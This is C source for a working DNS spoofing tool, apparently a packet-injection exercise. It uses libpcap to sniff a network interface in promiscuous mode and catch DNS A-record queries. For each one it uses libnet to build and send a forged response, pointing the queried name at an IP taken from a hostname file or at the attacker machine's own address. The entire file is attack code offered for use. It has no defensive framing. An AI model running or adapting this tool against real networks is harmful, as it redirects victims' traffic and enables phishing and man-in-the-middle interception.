#include "header.h"

char ip[100][16];
char hostnames[100][128];
int hostname_count = 0;
char *interface = NULL;
u_int32_t lIP = -1;
libnet_t *context;
char errbuf[LIBNET_ERRBUF_SIZE];

void readHostnameFile(char *filename) {
	int i = 0;
	char line[256];
	char ret[256];
	FILE *fd = fopen(filename, "r");
	if (fd == NULL) {
		fprintf(stderr, "Hostname file name incorrect");
		exit(EXIT_FAILURE);
	} else {
		while (fgets(line, sizeof(line), fd) != NULL && strlen(line) > 1) {
			char *token = strtok(line, " ");
			while (token) {
				strcpy (ip[i], token);
				token = strtok(NULL, " ");
				token[strlen(token)-1] = '\0';
				strcpy(hostnames[i],token);
				token = strtok(NULL, " ");
//				fprintf(stderr, "%s %s", ip[i], hostnames[i]);
				hostname_count += 1;
				i++;
			}
		}
	}
	fclose(fd);
}

in_addr_t check_hostnames(char *hostname) {
	int i = 0;	
	if (hostname_count > 0) {
		for (i = 0; i < hostname_count; i++) {
			if (strcmp(hostnames[i], hostname) == 0) {
				//fprintf(stderr, "Found\n");	
				return inet_addr(ip[i]);
			}
		}
	} else {
		return -1;
	}
	if (i == hostname_count)
		return -1;
}

void setLocalIP(char *interface) {
	
	if ((context = libnet_init(LIBNET_LINK, interface, errbuf)) == NULL) {
		fprintf(stderr, "Libnet init failed");
		return;
	}
	if ((lIP = libnet_get_ipaddr4(context)) == -1) {
		fprintf(stderr, "Getting local IP error");
		return;
	}
	libnet_destroy(context);	

}

void handler(u_char *usrarg, const struct pcap_pkthdr* pkthdr, const u_char *packet) {
	const struct ethhdr *eptr = (struct ethhdr*)(packet);
	if (ntohs(eptr->h_proto) != ETHERTYPE_IP) {
		return;
	}
	const struct ip *ip = (struct ip*) (packet + SIZE_ETHERNET);
	if ((ip->ip_hl)*4 < 20) {
		return;
	}
	if (ip->ip_p != IPPROTO_UDP) {
		return;
	}

	struct udphdr *udp;
	udp = (struct udphdr *) (packet + SIZE_ETHERNET + IP_HEADER_SIZE);
	if (ntohs(udp->dest) != 53) {
		return;
	}



	struct dnshdr *dns;
	dns = (struct dnshdr *) (packet + SIZE_ETHERNET + IP_HEADER_SIZE + UDP_HEADER_SIZE);
	if (dns->opcode != QUERY) {
		return;
	}
	//fprintf(stderr, "Id: %d %d", dns->id, ntohs(dns->id));
	char *dns_payload = (char *) (packet + SIZE_ETHERNET + IP_HEADER_SIZE + UDP_HEADER_SIZE + DNS_HEADER_SIZE);
	int payload_size = strlen(dns_payload);
	char hostname[128];
	if (dn_expand((u_char *)dns, (u_char *)(packet + pkthdr->caplen), dns_payload, hostname, sizeof(hostname)) < 0) {
		return;
	}
	hostname[payload_size-1] = '\0';
	//fprintf(stderr, "Hostname: %s\n", hostname);
	int type = (int)*(dns_payload + payload_size + 2);
	if (type != T_A) {
		return;
	}

	int i;

	u_int32_t localIP = -1;
	if (hostname_count == 0 || (localIP = check_hostnames(hostname)) == -1) {
		localIP = lIP;

	}


	u_char response[512];

	memcpy(response, dns_payload, payload_size + 5);	
	memcpy(response + payload_size + 5,"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x04\x00\x04", 12);
	*((u_long *)(response + payload_size + 17)) = localIP;	

	int response_size = payload_size + 21;
	int packetSize = LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H + response_size;


	if ((context = libnet_init(LIBNET_RAW4, interface, errbuf)) == NULL) {
		fprintf(stderr, "Libnet init error");
		return;
	}


	if (libnet_build_dnsv4(LIBNET_DNS_H, ntohs((short)dns->id), 0x8580, 1, 1, 0, 0, response, response_size, context, 0) == -1) {
		fprintf(stderr, "dns build failed");
		return;
	}

	if (libnet_build_udp(ntohs(udp->dest), ntohs(udp->source), packetSize - LIBNET_IPV4_H, 0, NULL, 0, context, 0) == -1) {
		fprintf(stderr, "udp build failed");
		return;
	}


	if (libnet_build_ipv4(packetSize, 0, 8964, 0, 64, IPPROTO_UDP, 0, ip->ip_dst.s_addr, ip->ip_src.s_addr, NULL, 0, context, 0) == -1) {
		fprintf(stderr, "ipv4 build failed");
		return;
	}

	if (libnet_write(context) == -1) {
		fprintf(stderr, "Write failed");
		return;
	}

	libnet_destroy(context);

}

int main(int argc, char **argv) {

	int param = 1;
	char expr[256] = "", *hostname = NULL;
	char *dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle;
	struct bpf_program fp;
	bpf_u_int32 mask;
	bpf_u_int32 net;


	if (argc > 1) {
		for (int j =1; j < argc; j=j+2) {
			if (strcmp(argv[j], "-i") == 0){
				interface = argv[j+1];
				param += 2;
//				printf("interface found %s\n", interface);
			} else if (strcmp(argv[j], "-h") == 0) {
				param += 2;
				hostname = argv[j+1];
//				printf("filename: %s\n",hostname);
			} 
		} 
		if (param < argc) {
			while (argc != param) {
				strcat(expr, argv[param]);
				strcat(expr, " ");
				param += 1;
			}
//			printf("Expression: %s\n",expr);
		}
	}
	if (hostname != NULL) {
		readHostnameFile(hostname);
	}
	dev = pcap_lookupdev(errbuf);
	if (dev == NULL) {
		fprintf(stderr, "Couldn't find device: %s\n", errbuf);
		return -1;
	}
	//printf("Dev: %s", dev);
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get net mask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}
	if (interface != NULL)
		handle = pcap_open_live(interface, 65535, 1, 1000, errbuf);
	else {
		interface = dev;
		handle = pcap_open_live(dev, 65535, 1, 1000, errbuf);
	}
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device: %s\n", errbuf);
		return -1;
	}
	if (expr != NULL && pcap_compile(handle, &fp, expr, 0, net) == -1){
		fprintf(stderr, "Filter complie error %s\n", pcap_geterr(handle));
		return -1;
	}
	if (expr != NULL && pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Set filter error %s\n", pcap_geterr(handle));
		return -1;
	}

	setLocalIP(interface);
	pcap_loop(handle, -1, handler, hostname);
	pcap_freecode(&fp);
	pcap_close(handle);

	return 0;


}
